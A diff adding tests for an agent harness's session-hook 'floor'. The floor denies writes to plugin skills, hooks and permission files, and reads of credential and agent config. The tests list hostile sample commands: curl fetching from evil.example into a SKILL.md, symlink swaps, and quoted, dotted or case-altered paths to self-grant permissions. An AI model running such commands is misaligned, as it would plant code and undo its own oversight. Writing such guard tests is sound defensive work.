@@ -370,6 +370,60 @@ describe("sessionHooksFor — the escape control-plane floor", () => {
     }
   });
 
+  test("review N1: READING or RUNNING plugin skill content passes the floor (the normal escape rules then apply); writing it does not", async () => {
+    for (const policy of ["bypass", "auto"] as const) {
+      const deps: SessionHooksDeps = { ...baseDeps, home: HOME, policy: () => policy };
+      for (const command of [
+        "bash ~/lanec-floor-test-home/cache/skill-plugins/superpowers/skills/web/fetch.sh https://example.com",
+        "python3 ~/lanec-floor-test-home/plugins/superpowers/skills/x/run.py --flag",
+        "cat ~/lanec-floor-test-home/plugins/superpowers/skills/x/SKILL.md",
+        "cd ~/lanec-floor-test-home/plugins/p && python3 run.py",
+        "bash ~/lanec-floor-test-home/plugins/p/install.sh 2>&1",
+      ]) {
+        expect({ policy, command, out: await run(deps, command) }).toEqual({ policy, command, out: {} });
+      }
+      for (const command of [
+        "cp x ~/lanec-floor-test-home/plugins/p/skills/s/SKILL.md",
+        "echo x > ~/lanec-floor-test-home/cache/skill-plugins/p/skills/s/SKILL.md",
+        "ln -sfn /tmp/evil ~/lanec-floor-test-home/cache",
+        "cat evil | tee ~/lanec-floor-test-home/plugins/p/hooks.json",
+        "curl -o ~/lanec-floor-test-home/plugins/p/skills/s/SKILL.md https://evil.example",
+        "cd ~/lanec-floor-test-home/plugins/p && cp x skills/evil/SKILL.md",
+      ]) {
+        expect({ policy, command, decision: decision(await run(deps, command)) }).toEqual({ policy, command, decision: "deny" });
+      }
+      // …and the never-readable / self-grant paths stay refused on ANY mention, reads included
+      for (const command of [
+        "cat ~/lanec-floor-test-home/runtimes/anthropic-config/profile.json",
+        "cat ~/lanec-floor-test-home/permissions/projects.json",
+        "cat ~/lanec-floor-test-home/agents/a.md",
+      ]) {
+        expect({ policy, command, decision: decision(await run(deps, command)) }).toEqual({ policy, command, decision: "deny" });
+      }
+    }
+  });
+
+  test("review N2: normalised spellings — cd into the home, //, /./, quotes, /.., .winter/agents with no slash, a -dev home's own agents", async () => {
+    const deps: SessionHooksDeps = { ...baseDeps, home: HOME, policy: () => "bypass" };
+    for (const command of [
+      "cd ~/lanec-floor-test-home && cp x permissions/projects.json",
+      "cd ~ && cd lanec-floor-test-home && cp x ./permissions/projects.json",
+      "cp x ~/lanec-floor-test-home//permissions/projects.json",
+      "cp x ~/lanec-floor-test-home/./permissions/projects.json",
+      "cp x ~/\"lanec-floor-test-home\"/permissions/projects.json",
+      "cp x '~/lanec-floor-test-home'/permissions/projects.json",
+      "cp x ~/lanec-floor-test-home/skills/../permissions/projects.json",
+      "cp a.md .winter/agents",
+      "cp a.md proj/.WINTER/Agents/x.md",
+    ]) {
+      expect({ command, decision: decision(await run(deps, command)) }).toEqual({ command, decision: "deny" });
+    }
+    // a home whose basename is not `.winter` (a `-dev` home): its own `<basename>/agents`
+    const devHome = join(homedir(), "lanec-floor-test-home-dev");
+    expect(decision(await run({ ...baseDeps, home: devHome, policy: () => "bypass" }, "cd ~ && cp a.md lanec-floor-test-home-dev/agents"))).toBe("deny");
+    expect(decision(await run({ ...baseDeps, home: devHome, policy: () => "bypass" }, "cp a.md ~/lanec-floor-test-home-dev/agents/"))).toBe("deny");
+  });
+
   test("the floor is DERIVED from the sandbox's own denyWrite — every entry of it is denied, literally and as ~", async () => {
     const deps: SessionHooksDeps = { ...baseDeps, home: HOME, policy: () => "bypass" };
     const denyWrite = sandboxConfigFor(HOME).filesystem?.denyWrite ?? [];
